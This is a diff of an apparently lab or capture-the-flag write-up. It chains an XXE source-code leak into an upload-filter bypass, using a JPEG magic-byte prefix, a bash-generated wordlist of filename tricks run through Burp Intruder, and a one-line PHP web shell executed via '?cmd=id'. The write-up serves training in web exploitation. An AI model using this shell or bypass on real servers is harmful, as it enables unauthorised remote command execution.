@@ -46,7 +46,7 @@ Since we confirmed the web application is vulnerable to XXE, we can use this to 
 ```
 {% endcode %}
 
-Now all we have to do is decode the **base64** and hopefully we got the source code of the upload.php file.
+Now all we have to do is decode the **base64** string and hope that we got the source code of the upload.php file.
 
 We can use the following command to do it:
 
@@ -56,39 +56,63 @@ echo "base64_string" | base64 --decode
 
 <figure><img src="../../../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>
 
-We manage to read the **upload.php** script. The **$target\_dir** indicates where the images are being saved. Also the $fileName gives us an important information, the dog.jpeg is renamed to **currentdate\_dog.jpeg**.
-
-
+We manage to read the **upload.php** script! The **$target\_dir** indicates where the images are being saved. Also notice that the **$fileName** gives us an important information, the dog.jpeg is renamed to **currentdate\_dog.jpeg** once gets uploaded to the server. This important in order to try to reach the image.
 
 <figure><img src="../../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>
 
+And we manage to get the actual image URL. It should look something like this:
 
+**`http://SERVER_IP:PORT/contact/hiddenpath/currentdate_filename.ext`**
 
+\
+Now lets try to bypass any image upload filtering.
 
+<figure><img src="../../../.gitbook/assets/image (149).png" alt=""><figcaption></figcaption></figure>
 
+We can use the same request used previously, we send it to the Intruder and made the following changes:
 
+Add the selection to the filename
+
+Keep the **ÿØÿà** - this is the ÿØÿà that will make the server read the content as a jpg file
+
+Add the \<?php echo "shell test";?> to test the code execution
+
+Create a word list with the following code:
+
+```bash
+for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do                      
+    for ext in '.jpeg' '.jpg'; do
+        echo "shell$char$ext.svg" >> wordlist.txt
+        echo "shell$ext$char.svg" >> wordlist.txt
+        echo "shell.svg$char$ext" >> wordlist.txt
+        echo "shell.svg$ext$char" >> wordlist.txt
+    done
+done
+```
+
+Lastly, make sure to disable URL encoding and launch the attack.
 
 <figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
 
-
+With this Request format we should look to the ones with a lenght over 366. In this case we select the **shell.phar:.jpg**.
 
 
 
 <figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
 
-
+And the PHP code was executed!
 
 <figure><img src="../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
 
+Now, lets send the same Request to the Repeater and make an actual shell.&#x20;
 
+Add the **shell.phar:.jpg** to the filename and `<?php system($_REQUEST['cmd']); ?>` after the **ÿØÿà** signature and send it!
 
 <figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
 
-
+We add the **?cmd=id** to the URL and we are able to successfully execute a command!
 
 <figure><img src="../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
 
-
-
-<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+Now we just have fun wandering around to look for the flag and eventually made it!
 
